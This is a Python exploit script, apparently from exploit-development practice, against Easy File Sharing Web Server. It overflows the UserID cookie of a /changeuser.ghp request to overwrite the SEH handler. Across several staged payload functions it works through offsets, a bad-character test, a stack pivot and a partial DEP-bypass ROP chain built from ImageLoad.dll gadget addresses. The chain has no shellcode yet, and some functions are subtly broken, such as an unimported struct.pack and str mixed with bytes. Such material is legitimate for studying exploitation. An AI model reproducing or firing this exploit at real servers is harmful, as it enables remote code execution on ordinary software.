import sys
from socket import *
from struct import pack

host = b"192.168.15.10"
port = 80

size = 5000
offset_to_nseh = 4059
offset_to_seh = offset_to_nseh + 4

def get_payload() -> bytes:
    # 4063 byte SEH offset
    # Stack pivot lands at padding buffer to SEH at offset 2563
    crash = "\x90" * 2563

    # Stack pivot lands here
    # Beginning ROP chain
    crash += struct.pack('<L', 0x90909090)

    # 4063 total offset to SEH
    crash += "\x41" * (4063-len(crash))

    # SEH only - no nSEH because of DEP
    # Stack pivot to return to buffer
    crash += struct.pack('<L', 0x10022869) # add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

    # 5000 total bytes for crash
    crash += "\x41" * (5000-len(crash))

    return crash

def get_payload1() -> bytes:
    payload = b"\x41" * size
    return payload

def get_payload2() -> bytes:
    payload = b""
    return payload

# 00180000 001c5000 SSLEAY32             /SafeSEH ON  /GS            C:\EFS Software\Easy File Sharing Web Server\SSLEAY32.dll
# 00400000 005c2000 fsws                 /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\fsws.exe
# 00ae0000 00bf7000 LIBEAY32             /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\LIBEAY32.dll
# 10000000 10050000 ImageLoad            /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll
# 61c00000 61c99000 sqlite3              /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll

# 0xffffee6c -4500

def get_payload3() -> bytes:
    payload = b"\x41" * offset_to_nseh
    payload += b"\x42" * 4
    payload += b"\x43" * 4
    payload += b"\x44" * (size - len(payload))
    return payload

def get_payload4() -> bytes:
    badchars = (  
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"  
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"  
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"  
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a"
        #b"\x3b"# -> badchar
        b"\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"  
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"  # --> OK
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"  
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"  
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"  
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"  
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"  
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"  
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"  
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"  
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"  
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
    )

    payload = b"\x41" * (offset_to_nseh - len(badchars))
    payload += badchars
    payload += b"\x90" * (offset_to_nseh - len(payload))
    payload += b"\x42" * 4
    payload += b"\x43" * 4
    payload += b"\x44" * (size - len(payload))
    return payload

def get_payload5() -> bytes:
    va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x48484848)) # dummy dwSize
    va += pack("<L", (0x49494949)) # # dummy flAllocationType
    va += pack("<L", (0x51515151)) # dummy flProtect

    # 0:009> s -a 0x0 L?80000000 w00tw00t
    # 03125ec1  77 30 30 74 77 30 30 74-41 41 41 41 41 41 41 41  w00tw00tAAAAAAAA
    # ...
    # 0:009> dd esp L1
    # 03126848  41414141
    # 0:009> ? 0x03125ec1 - 0x03126848
    # Evaluate expression: -2439 = fffff679


    payload  = b"w00tw00t"
    payload += b"\x41" * (offset_to_seh - len(va) - 8)
    payload += va
    payload += pack('<L', (0x1002280a)) # 0x1002280a: add esp, 0x1004; ret;
    payload += b"\x44" * (size - len(payload))
    return payload

def get_payload6() -> bytes:
    va  = pack("<L", (0x45454545)) # dummy VirtalAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x48484848)) # dummy dwSize
    va += pack("<L", (0x49494949)) # # dummy flAllocationType
    va += pack("<L", (0x51515151)) # dummy flProtect

    payload  = b"\x41" * (2439 - 4)
    payload += va
    payload += b"\x42" * (offset_to_seh - len(payload))
    payload += pack('<L', (0x1002280a)) # 0x1002280a: add esp, 0x1004; ret;
    payload += b"\x44" * (size - len(payload))
    return payload

def get_payload7a() -> bytes:
    va  = pack("<L", (0x45454545)) # dummy VirtalAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x48484848)) # dummy dwSize
    va += pack("<L", (0x49494949)) # # dummy flAllocationType
    va += pack("<L", (0x51515151)) # dummy flProtect

    payload  = b"\x41" * (2439)
    payload += va
    # payload += pack('<L', (0x100105e1)) # 0x100105e1: pop esi; ret; -> ESI = VirtualAlloc address
    # payload += pack('<L', (0x1001a3d4)) # 0x1001a3d4: mov eax, esi; pop esi; ret; -> EAX = ESI, ESI = junk
    # payload += pack('<L', (0x1002466d)) # 0x1002466d: push eax; ret; -> VirtualAlloc stack
    # payload += pack('<L', (0x42424242)) # junk
    payload += b"\x42" * (offset_to_seh - len(payload))
    payload += pack('<L', (0x1002280a)) # 0x1002280a: add esp, 0x1004; ret;
    payload += b"\x44" * (size - len(payload))
    return payload

def get_payload7b() -> bytes:
    # 000000001004D1FC		VirtualAlloc	KERNEL32

    payload  = b"\x90" * (2439 - 4)

    # VirtualAlloc
    payload += pack('<L', (0x10015442))     # 0x10015442  # pop eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x1004D1FC))     # IAT VirtualAlloc ImageLoad.dll
    payload += pack('<L', (0x1002248c))     # 0x1002248c  # mov eax, dword ptr [eax]; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x1002466d))     # 0x1002466d  # push eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x100105e1))     # 0x100105e1  # pop esi; ret;  :: ImageLoad.dll ---> COPY VirtualAlloc to ESI

    # Return Address
    payload += pack('<L', (0x10022199))     # 0x10022199  # inc eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x10022199))     # 0x10022199  # inc eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x10022199))     # 0x10022199  # inc eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x10022199))     # 0x10022199  # inc eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x1002466d))     # 0x1002466d  # push eax; ret;  :: ImageLoad.dll
    payload += pack('<L', (0x10013808))     # 0x10013808  # pop ebp; ret;  :: ImageLoad.dll
    payload += pack('<L', (0xfffffdf0))     # -0x210
    payload += pack('<L', (0x1001283e))     # 0x1001283e  # sub eax, ecx; ret;  :: ImageLoad.dll

    #payload += pack('<L', 0x61c05e8c)   # xchg eax, ebp ; ret: sqlite3.dll (non-ASLR enabled module)  -> EAX = EBP, EBP = 0
    # payload += pack('<L', (0x100105e1)) # 0x100105e1: pop esi; ret; -> ESI = VirtualAlloc address
    # payload += pack('<L', (0x1001a3d4)) # 0x1001a3d4: mov eax, esi; pop esi; ret; -> EAX = ESI, ESI = junk
    # payload += pack('<L', (0x1002466d)) # 0x1002466d: push eax; ret; -> VirtualAlloc stack
    # payload += pack('<L', (0x42424242)) # junk
    payload += b"\x43" * (offset_to_seh - len(payload))
    payload += pack('<L', (0x1002280a)) # 0x1002280a: add esp, 0x1004; ret;
    payload += b"\x44" * (size - len(payload))
    return payload

def main():

    crash = get_payload7b()

    # Replicating HTTP request to interact with the server UserID contains the vulnerability
    http_request  = b"GET /changeuser.ghp HTTP/1.1\r\n"
    http_request += b"Host: %s\r\n" % host
    http_request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
    http_request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    http_request += b"Accept-Language: en-US,en;q=0.5\r\n"
    http_request += b"Accept-Encoding: gzip, deflate\r\n"
    http_request += b"Referer: http://%s/\r\n" % host
    http_request += b"Cookie: SESSIONID=9349; UserID=" + crash + b"; PassWD=;\r\n"
    http_request += b"Connection: Close\r\n"
    http_request += b"Upgrade-Insecure-Requests: 1\r\n"

    print ("\n[!] Connecting to %s:%s ..." % (host, port))

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    print ("[!] Sending the packet...")

    s.send(http_request)
    s.close()
    
    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()